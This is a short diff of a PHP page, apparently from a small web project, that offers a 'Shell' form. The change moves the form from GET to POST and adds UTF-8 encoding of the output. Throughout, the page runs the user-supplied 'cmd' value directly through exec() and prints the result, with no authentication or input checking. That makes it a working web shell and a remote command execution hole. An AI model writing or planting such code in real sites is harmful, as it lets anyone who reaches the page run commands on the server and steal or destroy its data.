@@ -33,7 +33,7 @@
 
                     <legend>Shell : </legend>
 
-                    <form id='test' method='GET' action='index.php'>
+                    <form id='test' method='POST' action='index.php'>
                         <div class='form-group'>
                             <label for='motif'>Commande : </label>
                             <input type='text' class="form-control myInput" id='cmd' name='cmd' placeholder="ls/cat/grep/locate..." required>
@@ -55,8 +55,8 @@
             <br/>
 
             <?php 
-				if(isset($_GET['cmd'])){
-					$cmd =$_GET['cmd'];
+				if(isset($_POST['cmd'])){
+					$cmd =$_POST['cmd'];
 							
 					echo "
                       <div class='row '>
@@ -70,7 +70,7 @@
 							
 					exec($cmd, $out);
 					foreach ($out as $clef => $val ){
-						echo $clef . " : " . $val ."<br/>" ;
+						echo utf8_encode($clef . " : " .$val ."<br/>") ;
 					}	
                   	
                   	echo "<div class='col-xs-2 col-sm-2 col-md-3 col-lg-3'></div> </div>";
